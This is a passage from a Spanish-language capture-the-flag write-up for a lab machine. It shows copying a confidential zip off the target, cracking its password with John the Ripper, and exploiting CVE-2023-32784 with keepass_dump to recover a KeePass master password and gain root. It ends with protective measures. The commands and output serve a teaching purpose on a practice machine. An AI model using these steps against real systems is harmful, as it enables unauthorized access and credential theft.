drwxr-xr-x  2 root root     4096 abr  1 19:55 .
drwxr-xr-x 18 root root     4096 abr  1 17:41 ..
-rw-r--r--  1 root root 93052465 abr  1 19:51 muyconfidencial.zip

mortadela@mortadela:~$ cd /opt/
mortadela@mortadela:/opt$ ls
muyconfidencial.zip
mortadela@mortadela:/opt$ ls -la
total 90880
drwxr-xr-x  2 root root     4096 abr  1 19:55 .
drwxr-xr-x 18 root root     4096 abr  1 17:41 ..
-rw-r--r--  1 root root 93052465 abr  1 19:51 muyconfidencial.zip
mortadela@mortadela:/opt$ 
```

Continuaremos explorando este archivo para ver qué secretos guarda.


### Transferencia del archivo confidencial

Vamos a llevarla a nuestra máquina host. Tenemos un Apache, pero no queremos compartir esta información con nadie ni dejar tantos rastros. Utilizamos un servidor HTTP simple para transferir el archivo.

```shell
python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Y desde nuestro host:

```shell
┌─[oscar@parrot]─[~/THL/mortadela]
└──╼ $ wget 10.0.2.15:8000/muyconfidencial.zip
--2024-07-15 18:07:03--  http://10.0.2.15:8000/muyconfidencial.zip
Conectando con 10.0.2.15:8000... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 93052465 (89M) [application/zip]
Grabando a: «muyconfidencial.zip»

muyconfidencial.zip                                             100%[=====================================================================================================================================================>]  88,74M  26,6MB/s    en 3,5s    

2024-07-15 18:07:07 (25,6 MB/s) - «muyconfidencial.zip» guardado [93052465/93052465]

┌─[oscar@parrot]─[~/THL/mortadela]
└──╼ $ ls
muyconfidencial.zip
┌─[oscar@parrot]─[~/THL/mortadela]
└──╼ $
```

### Descompresión del archivo

Procedemos a descomprimir el archivo para ver su contenido:

```shell
┌─[oscar@parrot]─[~/THL/mortadela]
└──╼ $ unzip muyconfidencial.zip 
Archive:  muyconfidencial.zip
[muyconfidencial.zip] Database.kdbx password: 
   skipping: Database.kdbx           incorrect password
   skipping: KeePass.DMP             incorrect password
┌─[✗]─[oscar@parrot]─[~/THL/mortadela]
```

### Cracking del hash

Para poder acceder al contenido del archivo, necesitaremos crackear el hash de la contraseña del archivo ZIP.

```shell
┌─[root@parrot]─[/home/oscar/THL/mortadela]
└──╼ # zip2john muyconfidencial.zip > hash
Created directory: /root/.john
ver 1.0 efh 5455 efh 7875 muyconfidencial.zip/Database.kdbx PKZIP Encr: 2b chk, TS_chk, cmplen=2170, decmplen=2158, crc=DF3016BC ts=9D09 cs=9d09 type=0
ver 2.0 efh 5455 efh 7875 muyconfidencial.zip/KeePass.DMP PKZIP Encr: TS_chk, cmplen=93049937, decmplen=267519983, crc=52EC3DC7 ts=9D79 cs=9d79 type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.

└──╼ # john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
pinkgirl         (muyconfidencial.zip)     
1g 0:00:00:00 DONE (2024-07-15 18:15) 12.50g/s 51200p/s 51200c/s 51200C/s 123456..oooooo
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
┌─[root@parrot]─[/home/oscar/THL/mortadela]
└──╼ #
```

### Extracción del contenido

Ahora que tenemos la contraseña, procedemos a extraer el contenido del archivo ZIP:

```shell
└──╼ # unzip muyconfidencial.zip 
Archive:  muyconfidencial.zip
[muyconfidencial.zip] Database.kdbx password: 
 extracting: Database.kdbx           
  inflating: KeePass.DMP             
┌─[root@parrot]─[/home/oscar/THL/mortadela]
└──╼ # ls
Database.kdbx  hash  KeePass.DMP  muyconfidencial.zip
┌─[root@parrot]─[/home/oscar/THL/mortadela]
└──╼ #
```

Ahora tenemos acceso a los archivos `Database.kdbx` y `KeePass.DMP`. Continuaremos investigando estos archivos para descubrir qué información valiosa contienen.


### Investigación sobre los archivos extraídos

Investigamos sobre el archivo `KeePass.DMP` y el archivo `Database.kdbx` de KeePass, y encontramos una vulnerabilidad y una herramienta útiles:

- **CVE-2023-32784**: Esta vulnerabilidad en KeePass permite extraer las contraseñas en texto claro de un archivo .kdbx sin necesidad de conocer la contraseña maestra. Más detalles pueden encontrarse en [INCIBE-CERT](https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2023-32784).
- **keepass_dump**: Una herramienta que explota esta vulnerabilidad para extraer las contraseñas. La herramienta puede descargarse desde su repositorio en GitHub: [keepass_dump](https://github.com/z-jxy/keepass_dump).

### Uso de keepass_dump

Procedemos a descargar y utilizar `keepass_dump` para extraer las contraseñas del archivo `KeePass.DMP`.

```shell
# Clonamos el repositorio
git clone https://github.com/z-jxy/keepass_dump.git
cd keepass_dump

# Compilamos la herramienta
make

# Utilizamos la herramienta para extraer las contraseñas
./keepass_dump KeePass.DMP
```

Analizaremos la salida de `keepass_dump` para identificar posibles contraseñas y usuarios que nos permitan avanzar en nuestra investigación.




### Extracción de contraseñas con keepass_dump

Una vez descargada la herramienta de GitHub e informados de cómo utilizarla, nos ponemos manos a la obra.

```shell
┌─[✗]─[root@parrot]─[/home/oscar/THL/mortadela/keepass]
└──╼ # python3 keepass_dump/keepass_dump.py -f KeePass.DMP                         
[*] Searching for masterkey characters
[-] Couldn't find jump points in file. Scanning with slower method.
[*] 0:	{UNKNOWN}
[*] 1:	x
[*] 2:	x
[*] 3:	x
[*] 4:	x
[*] 5:	x
[*] 6:	x
[*] 7:	x
[*] 8:	x
[*] 9:	x
[*] 10:	x
[*] 11:	x
[*] 12:	x
[*] 13:	x
[*] Extracted: {UNKNOWN}xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

**NOTA:** El primer carácter no se puede recuperar. Obtenemos `xxxxxxxxxxxxxxxxxxx`, nos falta el primer carácter. Probando logramos acceder con `Xxxxxxxxxxxxx`.


![Imagen del resultado de keepass](/img/posts/CTF/mortadela/keepass.png)

### Acceso como root

Con la contraseña obtenida, procedemos a acceder al sistema con privilegios de root.

```shell
# Accedemos como root utilizando la contraseña obtenida
su root
Password: Xxxxxxxxxxxxxxxxxx
```



Con esto hemos conseguido acceder a root y obtener las flags de root & user.

### Conclusión


### Herramientas Utilizadas

- Nmap
- Hydra
- Linpeas
- Keepass_dump
- John the Ripper

### Medidas de Protección

Para proteger un sistema contra los métodos utilizados en este CTF, se recomienda:

1. **Actualizar y parchear el software**: Mantener todos los sistemas y aplicaciones actualizados con los últimos parches de seguridad.
2. **Seguridad en la configuración de servicios**: Configurar correctamente servicios como SSH y MySQL para evitar el acceso no autorizado.
3. **Contraseñas fuertes y únicas**: Usar contraseñas fuertes y únicas para todas las cuentas y servicios, y almacenarlas en un gestor de contraseñas seguro.
4. **Monitorización y auditoría**: Implementar sistemas de monitorización y auditoría para detectar y responder a actividades sospechosas.

### Lecciones Aprendidas

1. **Enumeración exhaustiva**: La importancia de realizar una enumeración exhaustiva antes de proceder con la explotación.
2. **Diversificación de herramientas**: Utilizar una variedad de herramientas para obtener una visión completa del sistema y sus vulnerabilidades.
3. **Identificación de "rabbit holes"**: Reconocer y evitar caer en "rabbit holes" que desvían la atención del objetivo principal.

### Cosas a Mejorar

1. **Documentación**: Mejorar la documentación de cada paso para asegurar que se capturan todos los detalles importantes.
2. **Automatización**: Implementar scripts y herramientas para automatizar partes del proceso de enumeración y explotación.
3. **Revisión de resultados**: Realizar una revisión más cuidadosa de los resultados obtenidos para no pasar por alto información crucial.

### Despedida

Espero que este writeup haya sido informativo y útil. La práctica en CTFs es una excelente manera de mejorar tus habilidades en ciberseguridad y aprender nuevas técnicas y herramientas. ¡Hasta la próxima!


